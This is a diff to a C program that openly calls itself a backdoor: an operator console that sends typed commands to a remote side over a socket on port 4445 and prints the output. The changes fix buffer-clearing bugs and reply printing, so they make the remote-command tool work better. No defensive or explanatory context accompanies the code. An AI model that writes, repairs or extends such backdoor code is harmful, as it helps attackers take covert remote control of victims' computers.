@@ -7,11 +7,6 @@
 #include <netinet/in.h>
 #define LOCAL "127.0.0.1" // you should use only ipv4 here
 #define PORT "4445"
-struct term
-{
-	char pwd[256];
-	int perm;
-}shell;
 int main(int argc, char*argv[])
 {
 	char buffer[300];
@@ -44,7 +39,7 @@ int main(int argc, char*argv[])
 		exit(1);
 	}
 	printf("\nconected sucessifuly\n");
-	memset(buffer,0,strlen(buffer));
+	memset(buffer,0,sizeof(buffer));
 	while(1)
 	{
 		printf("\nserver@backdoor$\\:");
@@ -52,10 +47,17 @@ int main(int argc, char*argv[])
 		send(fdc,buffer,sizeof(buffer),0);
 		printf("sent!\n");
 		printf("wait...\n\n");
-		memset(buffer,0,strlen(buffer));
+		memset(buffer,0,sizeof(buffer));
 		recv(fdc,buffer,sizeof(buffer),0);
-		printf("%s",buffer);
-		memset(buffer,0,strlen(buffer));
+		int a=0;
+		while(a<sizeof(buffer))
+		{
+			if(buffer[a] == -1)
+				break;
+			printf("%c",buffer[a]);
+			a++;
+		}
+		memset(buffer,0,sizeof(buffer));
 	}
 	close(fdc);
 	close(fds);
